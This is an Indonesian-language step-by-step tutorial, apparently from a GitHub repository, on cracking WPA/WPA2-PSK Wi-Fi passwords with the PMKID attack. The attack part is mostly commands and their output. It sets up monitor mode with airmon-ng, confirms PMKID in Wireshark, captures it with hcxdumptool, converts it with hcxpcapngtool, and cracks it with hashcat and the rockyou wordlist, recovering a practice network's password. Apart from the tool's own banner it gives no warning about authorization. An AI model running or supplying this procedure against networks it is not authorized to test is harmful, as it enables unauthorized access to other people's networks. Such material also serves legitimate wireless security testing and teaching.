# Hack Wi-Fi WPA/WPA2-PSK (PMKID)

## Bahan-Bahan
- PC/Laptop
- OS Linux
- Adapter Wi-Fi (support mode monitor)
- Aircrack-NG suite
- Wireshark
- Hcxdumptool
- Hcxtools
- Hashcat
- Koneksi internet

## Instal Tools

```
sudo apt-get update
sudo apt-get install aircrack-ng wireshark hcxdumptool hcxtools hashcat hashcat-data
```

## Langkah-Langkah

#### 1. Aktifin Mode Monitor

```
sudo airmon-ng check kill
sudo airmon-ng start [interface]
```

#### 2. Scan Wi-Fi

```
sudo airodump-ng [interface]
```

> [!NOTE]
> Tool `airodump-ng` kaga ada opsi buat ngedetek apakah sebuah AP itu ngedukung PMKID atau kaga. Solusinya kita cari tau secara manual pake Wireshark.

#### 3. Set Channel Interface dengan Channel AP Target

```
sudo airmon-ng start [interface] [channel]
```

#### 4. Capture Trafik Wi-Fi Make Wireshark

```
sudo wireshark -i [interface] -k
```

#### 5. Filter Protokol EAPOL

```
eapol
```

#### 6. Pancing EAPOL Pake Password Palsu

Konekin device kita ke Wi-Fi target menggunakan password yang salah. Tujuannya buat mancing PMKID.

#### 7. Analisis Trafik di Wireshark

1. Fokusin di bagian kolom `Info`, terus klik yang `Key (Message 1 of 4)`.

   ![](https://github.com/fixploit03/apa-bae-ada/blob/main/wireless%20hacking/attack/pmkid%20hashcat/img/1.png)

   Dari gambar di atas muncul output M1 (`Message 1 of 4`) dan M2 (`Message 2 of 4`) yang ngulang-ngulang. Itu tandanya bahwa password yang dimasukin sama client itu salah.
2. Klik tanda panah yang ada di `802.1X Authentication`.

   ![](https://github.com/fixploit03/apa-bae-ada/blob/main/wireless%20hacking/attack/pmkid%20hashcat/img/2.png)
3. Klik tanda panah yang ada di `WPA Key Data`.

   ![](https://github.com/fixploit03/apa-bae-ada/blob/main/wireless%20hacking/attack/pmkid%20hashcat/img/3.png)
4. Klik tanda panah yang ada di `Tag: Vendor Specific`.

   ![](https://github.com/fixploit03/apa-bae-ada/blob/main/wireless%20hacking/attack/pmkid%20hashcat/img/4.png)
5. Nah, inilah PMKID Nya. Berarti AP target mendukung PMKID.

   ![](https://github.com/fixploit03/apa-bae-ada/blob/main/wireless%20hacking/attack/pmkid%20hashcat/img/5.png)
6. Stop capture, close Wireshark.

#### 8. Bikin Filter BPF (Berkeley Packet Filter)

```
sudo hcxdumptool --bpfc="wlan addr3 [bssid]" > filter.bpf
```

#### 9. Capture PMKID

```
sudo hcxdumptool -i [interface] -w [output] -c [channel]a --bpf=[filter_bpf] --rds=2 --disable_disassociation --exitoneapol=1
```

Output:

```
This is a highly experimental penetration testing tool!
It is made to detect vulnerabilities in your NETWORK mercilessly!
Misuse within a network, without specific authorization, may cause
irreparable damage and result in significant consequences!
Not understanding what you were doing is not going to work as an excuse!

starting...

85 Packet(s) captured by kernel
0 Packet(s) dropped by kernel
exit on PMKID
```

#### 10. Convert File Capture ke Format Hash Hashcat

```
hcxpcapngtool -o [hash] [file_capture]
```

Output:

```
hcxpcapngtool 6.3.5 reading from LATIHAN.pcapng...

summary capture file
--------------------
file name................................: LATIHAN.pcapng
version (pcapng).........................: 1.0
operating system.........................: Linux 6.17.10+kali-amd64
application..............................: hcxdumptool 7.0.0
interface name...........................: wlan0
interface vendor.........................: 9c5322
openSSL version..........................: 1.1
weak candidate...........................: 12345678
MAC ACCESS POINT.........................: 002419d6c346 (incremented on every new client)
MAC CLIENT...............................: 906f18209419
REPLAYCOUNT..............................: 61623
ANONCE...................................: 2292da4676e2ec21cdc034cfd40bf2680817c889db3759339c645ea841b78cc9
SNONCE...................................: af014d26fd776ce944bcea588c04d815fbe3dcbf6dc8d7a77350b4b334b39f95
timestamp minimum (timestamp)............: 23.01.2026 02:04:50 (1769133890)
timestamp maximum (timestamp)............: 23.01.2026 02:04:52 (1769133892)
duration of the dump tool (seconds)......: 2
used capture interfaces..................: 1
link layer header type...................: DLT_IEEE802_11_RADIO (127)
endianness (capture system)..............: little endian
packets inside...........................: 3
frames with FCS (radiotap)...............: 3
frames with correct FCS (crc)............: 3
packets received on 2.4 GHz..............: 3
ESSID (total unique).....................: 1
BEACON (total)...........................: 1
BEACON on 2.4 GHz channel (from IE_TAG)..: 11 
EAPOL messages (total)...................: 1
EAPOL RSN messages.......................: 1
EAPOL ANONCE error corrections (NC)......: not detected
EAPOL M1 messages (total)................: 1
RSN PMKID (total)........................: 1
RSN PMKID (best).........................: 1
RSN PMKID ROGUE..........................: 1
RSN PMKID written to 22000 hash file.....: 1

frequency statistics from radiotap header (frequency: received packets)
-----------------------------------------------------------------------
 2462: 3
```

#### 11. Crack Hash

```
hashcat -a 0 -m 22000 [hash] [wordlist]
```

Output:

```
Host memory allocated for this attack: 512 MB (6481 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

542766729ff1cd96d069382990c40c94:48a98a2cfce3:906f18209419:LATIHAN:12345678
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: hash.txt
Time.Started.....: Fri Jan 23 09:16:35 2026 (0 secs)
Time.Estimated...: Fri Jan 23 09:16:35 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 8-63 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:     2123 H/s (22.18ms) @ Accel:65 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 798/14344385 (0.01%)
Rejected.........: 603/798 (75.56%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456789 -> password2
Hardware.Mon.#01.: Util: 26%

Started: Fri Jan 23 09:16:29 2026
Stopped: Fri Jan 23 09:16:38 2026
```

#### 12. Liat Hasil

```
hashcat -a 0 -m 22000 [hash] --show
```

Output:

```
542766729ff1cd96d069382990c40c94:48a98a2cfce3:906f18209419:LATIHAN:12345678
```

Password Wi-Fi: `12345678`
